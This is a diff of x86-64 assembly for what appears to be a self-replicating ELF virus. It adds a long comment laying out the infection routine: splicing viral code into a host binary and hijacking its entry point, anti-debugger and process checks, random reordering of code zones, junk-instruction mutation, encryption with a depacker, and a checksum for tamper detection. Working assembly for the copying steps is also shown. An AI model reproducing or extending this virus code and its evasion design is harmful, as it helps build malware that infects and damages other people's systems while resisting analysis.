@@ -210,6 +210,60 @@ _init_mmap_tmp:
 	mov r10, QWORD [rsp] ; take mmap_base_addr
 	add r10, 40 ; go to sh_offset
 	add QWORD [r10], PAGE_SIZE ; add pagesize
+
+;; Descryption of how we will overwrite the binary:
+;	First, write the content of the binary that is before the offset
+;		where we will put our virus.
+;	Then, we write the old entry point of the binary.
+;	Then, we write the starting code of our binary, beginning to _string and ending at the end
+;		of _verif (famine.s file).
+;	After this is done, we will write our functions who check for debugers, processus etc...
+;		this part start at _checkproc, and end at the beginning of _functions_offset_from_start
+;		this part is separated in 4 zone:
+;			-----
+;			checkproctest.s
+;			ft_strlen.s
+;			ft_is_integer_string.s
+;			ft_strequ.s
+;			-----
+;			checkdbg.s
+;			-----
+;			crc32.s
+;			-----
+;			checkdbg_by_status_file.s
+;			ft_strstr.s
+;			ft_atoi.s
+;			ft_itoa.s
+;			-----
+;		But when infecting, we will swap theis zone randomly. But all the unencrypted part of the virus
+;			contains junk instruction, that we will modify randomly at infection. So when we will swap theis
+;			zones we need to update _functions_offset_from_start table, and _table_offset table.
+;			The first one contain offset from start of our functions, so we can retrieve them with theis offset.
+;			Second one contain junk instruction offset from start, so we need to update them too to modify only
+;			junk instruction with junk instruction.
+;			To swap theis zones, we will init at 0 a table of the size of our _functions_offset table.
+;			then we will get a random number between 0 and size-1. And we will check for the first function
+;			at this offset that is not already righten on file. then we decremente our max random number.
+;			So when our max random number is at 0, we technically writed all the part.
+;			When writing a function, we update the _table_offset table. To do it, we check all offset of the table,
+;			and update only theis who is between ou actual function offset and actual function offset + size.
+;			(actual is because we take offset of the actual file, not the offset we get randomly).
+;			then we take the difference between actual function offset and randomly getted function offset, and add
+;			this difference to our _table_offset who matched with this zone.
+;	Then we write our _jump_to_function function.
+;	Then we write our encrypted part, it will be done in 3 steps:
+;		First, we will encrypt from _encrypted_part_start, to _table_offset (excluded). We get the key generated to
+;			encrypt.
+;		Second, we encrypt our _table_offset, with the key we previously getted.
+;		Third, we encrypt from the end of _table_offset to start of _padding (excluded), with the key previously getted.
+;	Then we write our key, and our depacker.
+;	After all of that is done, we run byterpl, who we will modify actual junk instructions with another junk instructions.
+;	Then we calcul the checksum of the text section (virus included), and store the start of checksum calculation, the size
+;		of calculation, and the result. Then we can check about modified code when virus is launched.
+;	Then we complite with a padding of 0x00 bytes to write a multiple of page size.
+;	After we write the end of the binary.
+;
+
 ;;;;;;;;;;;;;;;;;
 ; mmap tmp
 _mmap_tmp:
@@ -246,6 +300,7 @@ _write_in_tmp_map:
 	rep movsb
 	add QWORD [rsp + 116], 8 ; add 8 to our index
 
+;; We copy the first part that is not encrypted, and will not move.
 _copy_start_point:
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
@@ -257,6 +312,9 @@ _copy_start_point:
 	cld
 	rep movsb
 
+;; Here is the part that is unencrypted and will be switched.
+;; We have 2 tables in our binary: _functions_offset_from_start, _table_offset
+;; The first one contains offset to the "zone" of our 
 _copy_unencrypted_part:
 	.init:
 	mov QWORD [rsp + 156], 0 ; min
